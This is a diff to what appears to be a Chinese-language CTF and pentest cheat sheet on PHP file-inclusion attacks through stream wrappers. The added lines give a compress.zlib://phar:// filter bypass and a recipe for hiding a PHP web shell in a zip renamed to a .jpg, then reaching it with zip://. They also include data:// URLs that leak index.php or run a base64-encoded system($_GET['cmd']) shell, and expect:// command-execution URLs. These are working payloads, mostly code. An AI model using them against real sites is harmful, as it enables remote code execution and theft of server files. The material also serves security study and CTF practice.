@@ -196,6 +196,7 @@ callphar.php
     include 'phar://aaa.bbb/shell.php';
 ?>
 ```
+如果不能使用phar://开头，我们可以使用的是 compress.zlib://phar://xxxx 这种方式进行绕过滤。
 ## **phar更改文件头魔术**
 在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。
 ```php
@@ -250,6 +251,28 @@ include "php://filter/resource=phar://./phar.phar/test.txt";
 ```
 参考：https://www.php.net/manual/zh/wrappers.php.php
 
+## **Wrapper zip://**
+Upload a Zip file with a PHPShell inside and access it.
+```php
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;
+mv payload.zip shell.jpg;
+rm payload.php
+
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+```
+## **Wrapper data://**
+```php
+http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
+```
+## **Wrapper expect://**
+```php
+http://example.com/index.php?page=expect://id
+http://example.com/index.php?page=expect://ls
+```
 ## **通过软链接文件**
 通过软链接的方式进行文件读取包含可绕过open_basedir的限制
 相关赛题：HCTF2018 hide and seek : https://xz.aliyun.com/t/3245#toc-6.
